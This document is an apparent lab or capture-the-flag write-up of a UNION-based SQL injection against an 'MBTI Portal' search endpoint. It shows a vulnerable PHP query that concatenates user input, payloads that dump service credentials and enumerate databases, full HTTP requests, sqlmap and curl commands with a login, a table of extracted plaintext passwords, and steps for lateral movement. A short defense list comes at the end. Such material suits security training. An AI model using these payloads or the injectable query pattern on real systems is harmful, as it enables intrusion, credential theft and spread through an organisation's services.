# SQL Injection Payloads for MBTI Portal

## Overview
The `/api/search.php` endpoint has a **UNION-based SQL injection** vulnerability that allows extracting data from the `dev_environment` database.

## Normal Search (How it appears on the web)

**Web UI**: Searches employees client-side using JavaScript
**API Endpoint**: Searches `employees` table in database

```bash
GET /api/search.php?q=MBTI2024
```

**Response**:
```json
{
  "success": true,
  "found": true,
  "count": 26,
  "employees": [
    {
      "employee_id": "MBTI2024001",
      "full_name": "Stefan Müller",
      "email": "stefan.mueller@mbti.local",
      "department": "CIVA-I",
      "role": "Security Engineer",
      "manager_name": "Klaus Weber"
    },
    ...
  ]
}
```

## SQL Injection Attack

### Vulnerable Query
```php
$query = "SELECT employee_id, full_name, email, department, role, manager_name 
          FROM employees 
          WHERE CONCAT(employee_id, ' ', full_name, ' ', email, ' ', department) LIKE '%" . $search . "%'";
```

### Exploitation

#### 1. Extract all credentials from dev_environment

**Payload**:
```
xxx%' UNION SELECT service_name,username,password,access_level,notes,'dev' FROM dev_environment.dev_credentials#
```

**Full Request**:
```http
GET /api/search.php?q=xxx%25%27%20UNION%20SELECT%20service_name,username,password,access_level,notes,%27dev%27%20FROM%20dev_environment.dev_credentials%23 HTTP/1.1
Host: portal.mbti.local
Cookie: PHPSESSID=your_session_id
```

**Response**:
```json
{
  "success": true,
  "found": true,
  "count": 6,
  "employees": [
    {
      "employee_id": "Gitea",
      "full_name": "admin",
      "email": "MBTIGit2024!Admin",
      "department": "administrator",
      "role": "Main Gitea administrator account",
      "manager_name": "dev"
    },
    {
      "employee_id": "Gitea",
      "full_name": "developer",
      "email": "DevGit@MBTI2024",
      "department": "developer",
      "role": "Standard developer account for repository access",
      "manager_name": "dev"
    },
    {
      "employee_id": "Gitea",
      "full_name": "peter.schneider",
      "email": "GitAccess!2024",
      "department": "developer",
      "role": "Peter Schneider development account",
      "manager_name": "dev"
    },
    {
      "employee_id": "Jenkins",
      "full_name": "jenkins-admin",
      "email": "JenkinsMBTI!2024",
      "department": "administrator",
      "role": "CI/CD pipeline administrator",
      "manager_name": "dev"
    },
    {
      "employee_id": "MySQL Dev",
      "full_name": "dev_admin",
      "email": "DevDB@2024MBTI",
      "department": "administrator",
      "role": "Development database admin",
      "manager_name": "dev"
    },
    {
      "employee_id": "Redis",
      "full_name": "redis-user",
      "email": "RedisDev2024!",
      "department": "read-write",
      "role": "Redis cache access",
      "manager_name": "dev"
    }
  ]
}
```

#### 2. List all databases

**Payload**:
```
xxx%' UNION SELECT schema_name,'1','2','3','4','5' FROM information_schema.schemata#
```

#### 3. List tables in dev_environment

**Payload**:
```
xxx%' UNION SELECT table_name,'1','2','3','4','5' FROM information_schema.tables WHERE table_schema='dev_environment'#
```

#### 4. Extract specific credential

**Payload** (Extract Gitea admin password):
```
xxx%' UNION SELECT service_name,username,password,'x','x','x' FROM dev_environment.dev_credentials WHERE username='admin'#
```

## Column Mapping

The UNION query must return 6 columns to match the original SELECT:

| Position | Original Column | SQLi Mapping |
|----------|----------------|--------------|
| 1 | `employee_id` | `service_name` |
| 2 | `full_name` | `username` |
| 3 | `email` | `password` ⚠️ |
| 4 | `department` | `access_level` |
| 5 | `role` | `notes` |
| 6 | `manager_name` | Static value `'dev'` |

## Extracted Credentials

| Service | Username | Password | Access Level |
|---------|----------|----------|--------------|
| Gitea | admin | MBTIGit2024!Admin | administrator |
| Gitea | developer | DevGit@MBTI2024 | developer |
| Gitea | peter.schneider | GitAccess!2024 | developer |
| Jenkins | jenkins-admin | JenkinsMBTI!2024 | administrator |
| MySQL Dev | dev_admin | DevDB@2024MBTI | administrator |
| Redis | redis-user | RedisDev2024! | read-write |

## Using SQLMap

```bash
# Get session first
SESSION=$(curl -s -X POST http://portal.mbti.local/api/auth.php \
  -H "Content-Type: application/json" \
  -d '{"employee_id":"MBTI2024837","password":"tekelomuxo"}' | jq -r '.token')

# Run SQLMap
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=$SESSION" \
  --batch \
  --level=3 \
  --risk=2 \
  -D dev_environment \
  -T dev_credentials \
  --dump
```

## Testing with cURL

```bash
# 1. Login
SESSION=$(curl -s -X POST http://portal.mbti.local/api/auth.php \
  -H "Content-Type: application/json" \
  -d '{"employee_id":"MBTI2024837","password":"tekelomuxo"}' | jq -r '.token')

# 2. Normal search
curl -H "Cookie: PHPSESSID=$SESSION" \
  "http://portal.mbti.local/api/search.php?q=Peter" | jq '.'

# 3. Extract credentials
curl -H "Cookie: PHPSESSID=$SESSION" \
  "http://portal.mbti.local/api/search.php?q=xxx%25%27%20UNION%20SELECT%20service_name,username,password,access_level,notes,%27dev%27%20FROM%20dev_environment.dev_credentials%23" \
  | jq '.employees[] | {service: .employee_id, user: .full_name, pass: .email}'
```

## Next Steps After Exploitation

1. **Gitea Access**: Use extracted Gitea credentials to access the Git repository
2. **Find More Secrets**: Look for SSH keys, API tokens in Git repos
3. **Privilege Escalation**: Use leaked credentials to escalate privileges
4. **Lateral Movement**: Access Jenkins, MySQL, Redis using extracted credentials

## Defense Recommendations

1. **Use Prepared Statements**: Never concatenate user input into SQL queries
2. **Input Validation**: Whitelist allowed characters
3. **Principle of Least Privilege**: Database user shouldn't have cross-database access
4. **Error Suppression**: Don't reveal SQL errors to users (already implemented with try/catch)
5. **WAF**: Implement Web Application Firewall to detect SQLi patterns
